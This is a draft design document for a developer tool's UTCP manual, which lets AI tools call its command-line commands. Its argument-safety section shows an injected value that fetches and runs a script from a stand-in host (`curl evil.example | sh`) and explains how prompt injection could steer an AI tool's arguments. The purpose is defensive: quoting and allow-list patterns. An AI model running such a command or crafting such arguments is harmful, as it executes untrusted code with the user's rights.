# The UTCP Manual

What `workbench manual` prints, how an AI tool's UTCP client loads it, and why the arguments of a tool call need care.

> **TO_REFINE: the whole page is a rough draft.** Nothing here is built. It was written from the public UTCP pages listed under [Sources](#sources), without the formal specification, which those pages do not give. Every section that needs more work carries the tag `TO_REFINE`, so `grep -rn TO_REFINE docs` lists what is left. The decision to use UTCP is [ADR 0022](./adrs/0022-ai-tools-reach-the-graph-through-utcp.md); the build plan is [step 8](./implementation-plan/step-8-utcp-manual.md).

Related pages: [usage guide](./usage-guide.md#connecting-an-ai-tool), [modes](./modes.md), [capability map](./capability-map.md#m-utcp-manual).

## What UTCP is, as far as the pages say

A UTCP manual is a JSON document that lists tools. Each tool says what it is called, what input it takes, and a **call template**: how the client reaches it. The client then calls the tool itself, with no server of the tool's maker in between. For a command-line program the call template type is `cli`: the client runs commands on the local machine.

## The manual shape (draft)

`TO_REFINE`: the field names come from the examples on the UTCP pages, not from a schema. Check each against the specification, and against the client the team will use.

```json
{
  "utcp_version": "1.0.1",
  "manual_version": "0.1.0",
  "tools": [
    {
      "name": "impact",
      "description": "Lists what is affected if a node changes, through the code and then through what runs, across projects. Use it before changing shared code.",
      "inputs": {
        "type": "object",
        "properties": {
          "node": { "type": "string", "pattern": "^[A-Za-z0-9_.:@/{}, -]{1,300}$" },
          "depth": { "type": "integer", "minimum": 0, "maximum": 10, "default": 2 }
        },
        "required": ["node", "depth"]
      },
      "tags": ["workbench", "graph"],
      "tool_call_template": {
        "call_template_type": "cli",
        "commands": [
          {
            "command": "workbench impact \"UTCP_ARG_node_UTCP_END\" --depth \"UTCP_ARG_depth_UTCP_END\" --json --workspace \"/home/you/acme/workspace\"",
            "append_to_final_output": true
          }
        ]
      }
    }
  ]
}
```

| Field | Draft value | Notes |
|---|---|---|
| `utcp_version` | `1.0.1` | The version in the UTCP intro example. `FORMAT_VERSION` in step 8 holds it |
| `manual_version` | The version of `workbench` | The manual is regenerated by `workbench manual`, so it can say which version wrote it |
| `tools[].name`, `description` | The eleven tools of [step 8](./implementation-plan/step-8-utcp-manual.md#the-tools) | |
| `tools[].inputs` | A JSON Schema object | Property names must equal the names in the placeholders |
| `tools[].tags` | `["workbench", "graph"]` | `TO_REFINE`: what clients use tags for |
| `tools[].tool_call_template` | `call_template_type: "cli"`, one command | |
| `append_to_final_output` | `true` | The pages disagree on the default, so the manual always says it |
| `--workspace` | The absolute workspace path, written into every command | Set when `workbench manual` runs |

`TO_REFINE`: `outputs` is left out. Whether clients need it is not stated.

The template facts, from the UTCP CLI page:
- `commands` is a list. The client runs them in one subprocess, as a generated shell script (`bash` on Unix).
- An argument goes in where the command has `UTCP_ARG_<name>_UTCP_END`.
- A missing required argument is a validation error. The pages do not say what happens to an argument that is not required.
- The output that comes back is captured with `2>&1`, so **standard error is mixed into the result**. Output that starts with `{` or `[` is parsed as JSON, otherwise it is text. A command that exits non-zero returns its standard error.
- The client waits 30 seconds when it loads a manual and 120 seconds for a call.

## Loading the manual (draft)

`TO_REFINE`: there are two ways, and the second has not been checked against a client.

**From a command.** The client runs `workbench manual` and reads the manual from its output. This is the way the UTCP pages show for command-line programs, and it needs no file:

```json
{
  "name": "workbench",
  "call_template_type": "cli",
  "commands": [
    {
      "command": "workbench manual --mode developer-support --workspace \"/home/you/acme/workspace\"",
      "append_to_final_output": true
    }
  ]
}
```

**From a file.** The UTCP intro shows a `text` call template with a `file_path`. Write the manual with `workbench manual > workbench.utcp.json` and point the template at the file. This is the way the [usage guide](./usage-guide.md#connecting-an-ai-tool) shows first, because the file can be read before it is trusted.

Either way, the manual does not change until it is read again, so load it again after upgrading `workbench`.

## Why arguments need care

This is the open point of ADR 0022 that decides whether the design holds.

**What happens.** A `cli` call template is a line of shell. The client puts the AI tool's argument into the line where the placeholder is, and runs the line in a script. The pages show the placeholder inside double quotes that the template author writes, as in `git commit -m "UTCP_ARG_message_UTCP_END"`. They warn against unsanitized input, and none says that the client escapes the value. So we must assume the value is inserted as plain text.

**Why that is a problem.** Suppose an AI tool calls `search` with the text `x"; curl evil.example | sh; echo "`. Inserted as plain text, the line becomes:

```
workbench query "x"; curl evil.example | sh; echo "" --json
```

The shell runs three commands. The second is whatever the text says. The value does not have to come from the user: an AI tool reads code, issues and documents, and text in any of them can steer the arguments it chooses. This is called prompt injection.

**What it would break.** Everything in the design that says "every command only reads" (capability M3, [modes](./modes.md)) is a property of `workbench`. A command line that is split by the shell is no longer one `workbench` command. It runs with the user's own rights, so it can write, delete or send files. The rule that keeps `developer-support` safe would then hold for nothing. The same applies in Release 3, where the operational tools reach a VM over SSH.

**What the shell treats as special inside double quotes.** Only four characters: `"`, `$`, the backtick and `\`. A value without them, inside double quotes, is one argument and is never read as shell. (A newline and a NUL byte are excluded too, to be safe.)

## The solution (draft)

`TO_REFINE`: this is a proposal, ranked. The first two parts are what the plan builds. The rest are what to do if a real client breaks an assumption.

**1. Quote every placeholder.** Every `UTCP_ARG_..._UTCP_END` in a template sits inside double quotes. Numbers too.

**2. Allow-list every argument in the schema.** A string argument has a JSON Schema `pattern` that lists the characters it may hold, and none of the four special ones. An integer has a `minimum` and a `maximum`. A fixed set is an `enum`. The example above shows the shape. The UTCP CLI page recommends the same.

| Argument | Allowed (draft) |
|---|---|
| A node name or id | `^[A-Za-z0-9_.:@/{}, -]{1,300}$` |
| Free text for `explore` and `search` | `^[A-Za-z0-9 _.,:;?'/()-]{1,300}$` |
| A project id, or no filter | `^([a-z0-9]+(-[a-z0-9]+)*|\*)$`: the rule for a `ProjectId`, or `*` |
| `kind` | An `enum` that includes `*`. `direction` is an `enum` |
| A number | An integer with a range |

**3. Generate and test it so it cannot drift.** `workbench manual` refuses to print a template that has an unquoted placeholder, or a string argument with no `pattern`, or a `pattern` that accepts one of the special characters. A test runs the real shell: it fills each template with the worst values the pattern still allows, runs the line with a stub in place of `workbench`, and checks that the stub received exactly one argument equal to the value. [Step 8, Task 4](./implementation-plan/step-8-utcp-manual.md#task-4-the-eleven-tools) lists the tests.

**4. Check the client, once, by hand.** Steps 1 to 3 are safe when the client either enforces the schema before inserting a value, or inserts the value exactly as given. Nothing on the UTCP pages says which. Before Release 1 ships, try a real client with a value that holds `"` and `$(...)`, and write down what it does. If it inserts such a value into the line without checking the schema, steps 1 to 3 do not protect the user, and the options below apply.

If the client does not hold up:

| Option | What it does | Cost |
|---|---|---|
| Ids only | `node`, `callers`, `callees`, `impact` and `neighbors` accept only a node id (`^[0-9a-f]{16}$`). `search` finds the id | Free text is left only in `search` and `explore`. An AI tool needs one more call |
| A local HTTP call template | The tool call is an HTTP request with a JSON body, so no shell is involved | A process has to listen on localhost. This is "UTCP over HTTP" (M4), and it brings back what ADR 0022 removed |
| Run in a sandbox | Wrap the command in a read-only container, as the UTCP CLI page shows | Docker becomes a requirement. Too heavy for Release 1 |
| Drop the free-text tools | Leave `search` and `explore` out of the manual | Loses `explore`, the tool the design says to start with |

Rejected: asking the AI tool to base64-encode its arguments. It is not a reliable thing to ask of a model, and the client still inserts the text.

## Arguments: all required, with defaults

**Decided; the default values marked `TO_REFINE` are not.** The UTCP pages do not say what a client does when an argument is left out. They say a missing required argument is a validation error, and that is all. A template is also a fixed line, so it cannot add `--depth` only when the AI tool gave one.

**What could go wrong with an optional argument.** The AI tool calls `impact` with only `node`. The client might reject the call. It might leave the placeholder in the line as text, so `workbench` receives `--depth "UTCP_ARG_depth_UTCP_END"` and exits with code 2. Or it might insert an empty string, and `--depth ""` fails the same way. In none of the three does leaving the argument out mean "use the default".

**The rule.** In the manual:
- Every argument of a tool is `required` in its schema, and has a `default` that the AI tool is told to send.
- `*` means no filter, for `project` and `kind`. It cannot be a project id, which is lowercase letters, digits and hyphens. Inside double quotes the shell does not expand it. `workbench` accepts `*` for `--project` and `--kind`.
- A flag that is only present or absent, such as `--no-source`, `--failed` and `--unreached`, and a repeatable option, `--edge`, are left out. They stay on the command line.
- `node` takes a node or a file, and one template cannot do either-or. So it is two tools, `node` and `file`, which makes eleven.

**What it costs.** The AI tool has to send more, and it loses `files --unreached`, `node --no-source` and `neighbors --edge` through the manual. Most defaults are in the [usage guide](./usage-guide.md): `search` limit 10, `callers` and `callees` depth 1 and limit 20, `impact` depth 2. The others are drafts: `explore` `max_files` 8, `file` limit 200, `neighbors` depth 1 and direction `both`.

`TO_REFINE`: check with a real client that an argument given at its default value is inserted as expected, and choose the draft defaults.

## Standard error

**Decided.** With `--json`, a command that succeeds writes nothing to standard error. The UTCP client captures a call as `workbench … 2>&1`, so anything on standard error would be mixed into the answer, and an answer that no longer starts with `{` is returned as text and not parsed. A command that fails still writes its message to standard error, and a failed call returns it, which is what the AI tool needs.

Query commands rarely write to standard error today. The rule makes that certain, and [step 7](./implementation-plan/step-7-command-line.md) has a test for every query command. If a query ever needs to warn, the notice goes inside the answer, as `freshness` already does.

`TO_REFINE`: confirm with a real client that standard error reaches the result as the pages say.

## Other open points

`TO_REFINE` for each.

- **The time limit.** A call is cut off after 120 seconds. Check that `explore` and `impact` stay under it on a large workspace.
- **Skills (K2).** A manual lists tools. Draft: skills are named in the tool descriptions or in an extra field, with their file paths. Check that a client ignores an unknown field instead of refusing the manual.
- **A Rust library.** A crate named `rs-utcp` exists on docs.rs. It has not been looked at. The draft builds the manual as a plain JSON value with no crate.
- **Windows.** The client runs PowerShell there. Workbench does not support Windows (X8), so nothing is drafted.
